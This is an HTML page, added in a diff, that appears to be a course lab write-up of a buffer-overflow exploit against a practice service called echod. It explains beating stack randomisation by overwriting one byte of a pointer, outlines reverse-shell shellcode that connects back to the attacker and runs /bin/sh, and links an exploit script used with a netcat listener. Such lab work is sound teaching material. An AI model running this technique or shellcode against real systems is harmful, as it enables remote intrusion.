@@ -1,0 +1,128 @@
+<html>
+  <head>
+    <meta http-equiv="content-type" value="text/html; charset=utf-8" />
+    <title>Exploiting Software: How to 0wn the Internet In Your
+      Free Time</title>
+  <link rel="stylesheet" type="text/css" href="/static/common.css" />
+  <style type="text/css">
+     #header h1 {
+        font-size: 150%;
+     }
+  </style>
+  </head>
+<body>
+  <div id="header"><h1>My <tt>HACKME</tt> exploit</h1></div>
+  <img src="stack.png" style="float: left; padding: 3em" alt="echod stack"/>
+  <div id="content">
+
+    <h3> Intro</h3>
+    <p>My goal with <tt>echod</tt> was to write an exploit that could
+    reliably get a shell quickly -- in, say, a few hundred tries at
+    most. Therefore, I looked for methods to avoid having to
+    brute-force the location of the stack, which is the thing ASLR is
+    best at hiding. The only data I control is the
+    200-byte <tt>buff</tt> on the stack, so unless I can write an
+    exploit using only information from libc (on further reflection,
+    this may be entirely possible), I need a way to figure out where
+    the stack lives.</p>
+
+    <h3> The plan</h3>
+    <p>One standard trick for getting around stack randomization is
+    the chain of rets trick explained in my talk. The problem is, the
+    only pointer onto the stack within our 200-byte exploit window is
+    the “addr” pointer, which points <b>deeper</b> into the stack, at
+    a structure we have limited control over (we (somewhat) control
+    the <tt>sin_addr</tt> field of the <tt>sockaddr_in</tt>). However,
+    it turns out that we can abuse this pointer in a clever way. The
+    fact that the overflow uses <tt>read</tt> directly, instead of
+    something that writes a terminator byte (e.g. <tt>strcpy</tt>)
+    means we have very precise control over what we're writing. In
+    particular, we have the ability to <b>only</b> overwite the low
+    byte of the <tt>addr</tt> pointer.</p>
+
+    <p>
+      If we look at the stack diagram to the left (produced from some
+      careful work in gdb), we note that <tt>buff</tt> begins 156
+      bytes below <tt>claddr</tt>. This means that if we get lucky,
+      and the final byte of <tt>addr</tt> is <tt>0x9c</tt> or
+      greater, <tt>addr</tt> and <tt>&amp;buff</tt> will differ only
+      in the LSByte, and we can generate a pointer to <tt>buff</tt> by
+      overwriting the bottom byte of <tt>addr</tt>. Moreover, we know
+      that values on the stack are word-aligned, so there are very few
+      possibilities for that low byte. In fact, it turns out that the
+      stack is not only word-aligned, but 16-byte-aligned
+      <a name="text1" /><a href="#note1"><sup>1</sup></a>, which means
+      that the low nibble is always the same across all runs
+      of <tt>echod</tt> If a search of the LSB fails, we can search
+      the 2<sup>nd</sup> LSB, which still gives us only about 256*16 =
+      4096 possibilities. We could conceivably still get lucky,
+      if <tt>addr</tt> points to, e.g. <tt>0xbf880032</tt>, but this
+      is extremely unlikely, so we'll ignore that possibility for now.
+    </p>
+
+    <h3>One last trick</h3>
+
+    <p>
+      But it turns out we can boost our odds even a little bit
+      further. Instead of targetting the beginning of <tt>buff</tt>,
+      we can put a <tt>jmp -98</tt> at the start of the <b>last</b>
+      word in <tt>buff</tt>, and aim for that. With a difference
+      of <tt>0x3c</tt> between <tt>claddr</tt> and that value, we now
+      have a 3/4 chance of not having to explore the 2<sup>nd</sup>
+      LSB at all. And even if we do have to, we then know the LSB must
+      be greater than <tt>0xC4</tt>, or else the first pass would have
+      found it. And the LSnibble still must be <tt>0xC</tt>, so our
+      extended search space is roughly 12 + 256*4 = 1036, which is
+      easily searchable in a few seconds. And in most cases, we'll get
+      it in one of those first 12.
+    </p>
+    <p>
+      We could even stick the <tt>jmp</tt>, and our target, as far
+      forward as <tt>%ebp</tt>, but I didn't bother, and it doesn't
+      really matter.
+      </p>
+
+    <h3>The shellcode</h3>
+
+    <p>As mentioned, I was writing an exploit for a shell, so my
+    shellcode is a standard connect-back code that opens a socket to
+    the attacker's machine, <tt>dup</tt>'s some fd's, and then
+    execs <tt>/bin/sh</tt>. In essence, it does:
+      <pre><code>
+          fd = socket(PF_INET, SOCK_STREAM, 0);
+          connect(fd, [addr], [port]);
+          dup2(fd, 0);
+          dup2(fd, 1);
+          execve("/bin/sh", ["/bin/sh", NULL], NULL);
+      </code></pre>
+    </p>
+    <p>The shellcode comes in at just under 100 bytes, and so barely
+    fits in our buffer, leaving very little room for NOP
+    padding. Fortunately, the above attack rapidly guesses an exact
+    pointer to <tt>buff</tt>.</p>
+
+    <ul>
+      <li><a href="cb.S">My connect-back shellcode</a></li>
+    </ul>
+
+    <h3>The code</h3>
+
+    <p><a href="hackit-echod.pl">hackit-echod.pl</a> implements the
+    above attack. Before running it, you must set up something,
+    e.g. netcat, listening for incoming connections on port
+    4444. Usage is <tt>perl hackit-echod.pl my-ip
+    target-hostname</tt>.</p>
+
+    <hr />
+    <div id="footnote">
+      <a name="note1" /><a href="#text1"><sup>1</sup></a> If we look
+      at <tt>echod</tt>, we see that gcc has generated code that does
+      <pre><code>and $0xfffffff0,%esp</code></pre> at the start
+      of <tt>main()</tt>, assuring that the stack is 16-byte
+      aligned. This presumably helps performance, but makes this
+      exploit even easier.
+    </div>
+
+  </div>
+</body>
+</html>
